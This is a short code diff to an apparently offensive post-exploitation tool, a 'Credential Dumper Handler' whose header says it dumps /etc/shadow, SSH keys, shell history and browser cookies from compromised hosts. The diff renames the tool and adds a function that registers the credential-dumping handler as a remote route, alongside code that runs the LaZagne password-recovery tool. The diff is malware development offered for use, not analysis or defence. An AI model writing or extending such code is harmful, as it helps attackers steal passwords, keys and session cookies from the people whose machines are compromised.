@@ -1,4 +1,4 @@
-# X404X Bridge — Credential Dumper Handler
+# Vesper Bridge — Credential Dumper Handler
 # =========================================
 # Dumps credentials from compromised hosts:
 #   Linux: /etc/shadow, ~/.ssh, ~/.bash_history, browser cookies
@@ -156,3 +156,10 @@ def _run_lazagne() -> dict:
     except Exception as e:
         results["errors"].append(f"LaZagne error: {e}")
     return results
+
+
+def register_routes(registry: dict) -> None:
+    """Expose this module's handlers under the 'cred_dump' group."""
+    registry["cred_dump"] = {
+        "dump": dump_credentials,
+    }
